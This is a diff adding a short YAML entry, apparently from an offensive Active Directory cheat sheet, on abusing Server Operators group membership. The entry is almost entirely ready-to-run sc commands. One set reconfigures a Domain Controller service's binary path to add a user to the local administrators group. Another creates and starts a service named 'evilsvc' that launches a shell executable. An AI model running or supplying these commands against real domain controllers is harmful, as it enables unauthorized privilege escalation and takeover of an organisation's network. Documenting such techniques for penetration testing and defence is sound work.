@@ -1,0 +1,12 @@
+name: ServerOperators
+description: Server Operators can configure services on Domain Controllers
+commands:
+- '# Modify existing service binary path'
+- sc \\<DC> config <SERVICE> binPath= "cmd /c net localgroup administrators <USER> /add"
+- sc \\<DC> stop <SERVICE> && sc \\<DC> start <SERVICE>
+- ''
+- '# Create new service'
+- sc \\<DC> create evilsvc binPath= "c:\temp\shell.exe" start= auto
+- sc \\<DC> start evilsvc
+opsec: []
+references: []
